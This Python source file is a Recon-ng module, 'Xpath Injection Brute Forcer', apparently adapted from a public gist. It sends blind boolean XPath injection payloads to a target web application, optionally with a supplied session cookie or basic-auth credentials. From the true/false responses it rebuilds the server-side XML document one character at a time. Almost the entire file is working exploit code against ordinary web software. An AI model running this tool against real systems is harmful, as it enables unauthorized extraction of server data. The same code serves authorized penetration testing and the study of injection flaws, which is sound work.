from __future__ import print_function
from recon.core.module import BaseModule
import urllib
import sys
# List of modifications:
# - swaped from and to or condition
# - added option to invers True/False strings
# - headers are now also checked for unique string
# - connection exceptions are handled

##
## c/o
## https://gist.github.com/dzmitry-savitski/ffb5dee6870816c34da9b467cc6e0053
##

class Module(BaseModule):

    meta = {
        'name': 'Xpath Injection Brute Forcer',
        'author': 'Tim Tomes (@LaNMaSteR53), modified by DSavitski',
        'description': 'Exploits XPath injection flaws to enumerate the contents of serverside XML documents using OR based statements.',
        'options': (
            ('base_url', None, True, 'target resource url excluding any parameters'),
            ('basic_user', None, False, 'username for basic authentication'),
            ('basic_pass', None, False, 'password for basic authentication'),
            ('cookie', None, False, 'cookie string containing authenticated session data'),
            ('parameters', None, True, 'query parameters with \'<inject>\' signifying the injection'),
            ('post', False, True, 'set the request method to post. parameters should still be submitted in the url option'),
            ('string', None, True, 'unique string found when the injection results in \'True\''),
            ('invert', False, True, 'Invert True condition to False?'),
        ),
    }

    def getRequest(self, strTest):
        payload = {}
        for param in self.lstParams:
            payload[param[0]] = param[1].replace('<inject>', strTest)
        
        resp = self.getResponse(payload)
        # process the response
        self.intCount += 1

        output = str(resp.headers) + resp.text
        
        result = False
        if self.strSearch in output:
            result = True

        if self.options['invert']:
            return (not result)
        else:
            return result
        
    def getResponse(self, payload):
        try:
            response = self.request(self.strUrl, method=self.strMethod, payload=payload, headers=self.dictHeaders, auth=self.tupAuth)
            return response
        except Exception:
            self.error("Request exception, retrying...")
            return self.getResponse(payload)


    def getLength(self, strTest):
        intLength = 0
        for x in range(0,10000):
            if self.getRequest(strTest % (x)):
                return x

    def getString(self, intLength, strTest):
        strResult = ''
        for x in range(1,intLength+1):
            found = False
            for char in self.strCharset:
                if self.getRequest(strTest % (x, char)):
                    strResult += char
                    print(char, end='')
                    found = True
                    break
            if not found:
                strResult += '?'
                print('?', end='')
        return strResult

    def checkItem(self, strItem, lstItems):
        for item in getattr(self, lstItems):
            if self.getRequest("' or name(%s)='%s" % (strItem, item)):
                return item

    def getAttribs(self, node):
        intAttribs = self.getLength("' or count(%s/@*)=%%d and '1'='1" % (node))
        for x in range(1,intAttribs+1):
            strAttrib = '%s/@*[%d]' % (node, x)
            print(' ', end='')
            # check if attrib matches previously enumerated attrib
            name = self.checkItem(strAttrib, 'attribs')
            if name:
                print(name, end='')
            else:
                # length of attrib name
                intNamelen = self.getLength("' or string-length(name(%s))=%%d and '1'='1" % (strAttrib))
                # attrib name
                name = self.getString(intNamelen, "' or substring(name(%s),%%d,1)='%%s' and '1'='1" % (strAttrib))
                self.attribs.append(name)
            # length of attrib value
            intValuelen = self.getLength("' or string-length(%s)=%%d and '1'='1" % (strAttrib))
            # attrib value
            print('="', end='')
            value = self.getString(intValuelen, "' or substring(%s,%%d,1)='%%s' and '1'='1" % (strAttrib))
            print('"', end='')

    def getXML(self, node='', name='', level=0):
        spacer = '   '*level
        intNodes = self.getLength("' or count(%s/*)=%%d and '1'='1" % (node))
        if not intNodes:
            # check for value
            intValuelen = self.getLength("' or string-length(%s)=%%d and '1'='1" % (node))
            if intValuelen:
                print('>', end='')
                value = self.getString(intValuelen, "' or substring(%s,%%d,1)='%%s' and '1'='1" % (node))
                print('</%s>' % (name))
            else:
                print('/>')
            return True
        if level != 0: print('>')
        for x in range(1,intNodes+1):
            strNode = '%s/*[%d]' % (node, x)
            print('%s<' % (spacer), end='')
            # check if node matches previously enumerated node
            name = self.checkItem(strNode, 'nodes')
            if name:
                print(name, end='')
            else:
                # length of node name
                intNamelen = self.getLength("' or string-length(name(%s))=%%d and '1'='1" % (strNode))
                # node name
                name = self.getString(intNamelen, "' or substring(name(%s),%%d,1)='%%s' and '1'='1" % (strNode))
                self.nodes.append(name)
            self.getAttribs(strNode)
            if not self.getXML(strNode, name, level + 1):
                print('%s</%s>' % (spacer, name))

    def module_run(self):
        self.strSearch = self.options['string']
        self.strUrl = self.options['base_url']
        #self.strCharset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789!"#$%&\'()*+,-./:;<=>?@[\]^_`{|}~'
        self.strCharset = 'aeorisn1tl2md0cp3hbuk45g9687yfwjvzxqASERBTMLNPOIDCHGKFJUW.!Y*@V-ZQX_$#,/+?;^ %~=&`\)][:<(>"|{\'}'
        self.intCount = 0
        self.nodes = []
        self.attribs = []
        strTrue = "' or '1'='1"
        strFalse = "' or '1'='2"

        # process parameters
        params = self.options['parameters']
        params = params.split('&')
        params = [param.split('=') for param in params]
        self.lstParams = [(urllib.unquote_plus(param[0]), urllib.unquote_plus(param[1])) for param in params]

        # process basic authentication
        username = self.options['basic_user']
        password = self.options['basic_pass']
        self.tupAuth = (username, password) if username and password else ()

        # process cookie authentication
        cookie = self.options['cookie']
        self.dictHeaders = {'Cookie': cookie} if cookie else {}

        # set the request method
        self.strMethod = 'POST' if self.options['post'] else 'GET'

        self.verbose("'True' injection payload: =>%s<=" % (strTrue))
        if self.getRequest(strTrue):
            self.alert("'True' injection test passed.")
        else:
            self.error("'True' injection test failed.")
            return

        self.verbose("'False' injection payload: =>%s<=" % (strFalse))
        if not self.getRequest(strFalse):
            self.alert("'False' injection test passed.")
        else:
            self.error("'False' injection test failed.")
            return

        self.output('Fetching XML...')
        self.getXML()
        self.output('%d total queries made.' % (self.intCount))


##
##
